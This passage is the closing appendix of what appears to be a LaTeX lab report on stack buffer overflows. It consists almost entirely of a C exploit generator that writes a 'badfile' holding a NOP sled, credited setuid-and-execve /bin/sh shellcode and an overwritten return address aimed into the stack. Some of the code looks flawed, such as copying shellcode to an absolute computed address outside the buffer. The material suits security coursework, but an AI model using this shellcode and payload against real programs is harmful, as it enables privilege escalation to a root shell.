	http://shell-storm.org/shellcode/files/shellcode-598.php 
*/
char shellcode[]=
"\x31\xdb"             /* xor    %ebx,%ebx       */
"\x8d\x43\x17"         /* lea    0x17(%ebx),%eax */
"\xcd\x80"             /* int    $0x80           */
"\x53"                 /* push   %ebx            */
"\x68\x6e\x2f\x73\x68" /* push   $0x68732f6e     */
"\x68\x2f\x2f\x62\x69" /* push   $0x69622f2f     */
"\x89\xe3"             /* mov    %esp,%ebx       */
"\x50"                 /* push   %eax            */
"\x53"                 /* push   %ebx            */
"\x89\xe1"             /* mov    %esp,%ecx       */
"\x99"                 /* cltd                   */
"\xb0\x0b"             /* mov    $0xb,%al        */
"\xcd\x80"             /* int    $0x80           */
;

void main(int argc, char **argv)
{  
	char buffer[517];
	FILE *badfile;
	long fcP;
	int buffer_size, shell_code_size;
	
	buffer_size = sizeof(buffer);
	shell_code_size = sizeof(shellcode);
	
	/* Initialize buffer with 0x90 (NOP instruction) */
	memset(&buffer, 0x90, 517);
	
	/* You need to fill the buffer with appropriate contents here */
	printf("Size of shellcode: %d\n", sizeof(shellcode));
	
	/* Print stack pointer */
	fcP = &buffer;
	
	/* Make sure is multiple of 4 */ 
	while(fcP % 4 != 0) {
		fcP += 1;
	}
	
	printf ("Using Stack pointer at address: %x\n", fcP);
	printf ("Buffer size: %d, shell code size: %d\n", buffer_size, shell_code_size);
	
	/* Compute how far we can palce shell code, we want it towards the end of buffer */
	long address_to_copy_to = fcP + buffer_size - 1 - shell_code_size;
	printf ("I will start writing to %08x\n", address_to_copy_to);
	
	/* We use address of buffer as reference, but we want to jump a bit more into the stack,
	yet not too far */
	fcP += 80;
	
	/* Place the address we want to in a position 
	that would overwrite return address (16 bytes into stack) */
	long addr = fcP;
	long *ptr = (long*)(buffer + 16);
	*(ptr) = addr;
	
	/* Copy shellcode */
	memcpy(address_to_copy_to, shellcode, shell_code_size);
	
	/* Save the contents to the file "badfile" */
	badfile = fopen("./badfile", "w");
	fwrite(buffer, 517, 1, badfile);
	fclose(badfile);
}
\end{lstlisting}

\end{appendices}

\end{document}
